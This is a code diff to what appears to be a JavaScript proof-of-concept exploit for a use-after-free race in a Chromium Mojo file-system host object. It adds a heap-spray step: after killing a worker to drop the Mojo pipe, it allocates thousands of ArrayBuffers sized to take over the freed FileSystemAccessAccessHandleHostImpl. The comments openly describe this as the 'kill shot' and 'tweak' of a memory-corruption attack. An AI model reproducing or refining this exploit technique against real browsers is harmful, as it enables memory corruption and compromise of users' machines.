@@ -40,15 +40,21 @@
                     if (e.data.type === 'log') {
                         logMessage(e.data.msg);
                     } else if (e.data.type === 'RACE_NOW') {
-                        // THE KILL SHOT: Terminate instantly to drop the Mojo pipe
+                        
+                        // 1. Kill the worker
                         worker.terminate();
                         clearTimeout(timer);
-                        logMessage("<span style='color:red;'>[+] Worker terminated. Pipe dropped.</span>");
-                        resolve();
-                    } else if (e.data.type === 'error') {
-                        logMessage("<span style='color:red;'>[-] Worker Error: " + e.data.msg + "</span>");
-                        worker.terminate();
-                        clearTimeout(timer);
+                        
+                        // 2. THE TWEAK: Spray the heap immediately!
+                        // We allocate thousands of ArrayBuffers to force the browser 
+                        // to overwrite the freed FileSystemAccessAccessHandleHostImpl object.
+                        window.spray = [];
+                        for (let i = 0; i < 5000; i++) {
+                            // 0x100 is roughly the size of the Host object in memory
+                            window.spray.push(new ArrayBuffer(0x100)); 
+                        }
+                
+                        logMessage("<span style='color:red;'>[+] Worker terminated & Heap Sprayed.</span>");
                         resolve();
                     }
                 };
